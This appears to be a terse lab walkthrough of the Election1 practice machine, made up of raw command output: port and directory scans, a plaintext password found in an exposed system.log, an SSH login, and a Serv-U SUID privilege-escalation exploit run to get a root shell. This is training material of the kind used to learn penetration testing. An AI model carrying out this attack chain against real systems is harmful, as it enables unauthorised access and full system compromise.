@@ -1,0 +1,81 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.152.211 > PGP__Election1.txt
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
+|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
+|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+http://192.168.152.211/robots.txt
+admin
+wordpress
+user
+election
+
+$ gobuster dir -u http://192.168.152.211 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+javascript           (Status: 403) [Size: 280]
+robots.txt           (Status: 200) [Size: 30]
+election             (Status: 200) [Size: 7003]
+phpmyadmin           (Status: 200) [Size: 10531]
+phpinfo.php          (Status: 200) [Size: 95451]
+server-status        (Status: 403) [Size: 280]
+
+Apache Version 	Apache/2.4.29 (Ubuntu)
+Apache API Version 	20120211
+Server Administrator 	webmaster@localhost
+Hostname:Port 	192.168.152.211:80
+User/Group 	www-data(33)/33 
+
+$ feroxbuster -u http://192.168.152.211 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip,aspx
+200      GET        4l       37w      265c http://192.168.152.211/election/admin/logs/system.log
+Assigned Password for the user love: P@$$w0rd@123
+
+$ ssh love@192.168.152.211  
+The authenticity of host '192.168.152.211 (192.168.152.211)' can't be established.
+ED25519 key fingerprint is: SHA256:z1Xg/pSBrK8rLIMLyeb0L7CS1YL4g7BgCK95moiAYhQ
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.152.211' (ED25519) to the list of known hosts.
+love@192.168.152.211's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-120-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+533 packages can be updated.
+425 updates are security updates.
+
+Your Hardware Enablement Stack (HWE) is supported until April 2023.
+Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
+love@election:~$ id
+uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
+
+love@election:~$ find / -perm -4000 -type f 2>/dev/null
+/usr/local/Serv-U/Serv-U
+
+$ searchsploit Serv-U -o
+Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2) | multiple/local/47173.sh
+
+love@election:/tmp$ chmod +x 47173.sh
+love@election:/tmp$ ./47173.sh
+[*] Launching Serv-U ...
+sh: 1: : Permission denied
+[+] Success:
+-rwsr-xr-x 1 root root 1113504 Jul  4 13:38 /tmp/sh
+[*] Launching root shell: /tmp/sh
+sh-4.4# id
+uid=1000(love) gid=1000(love) euid=0(root) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
+
+
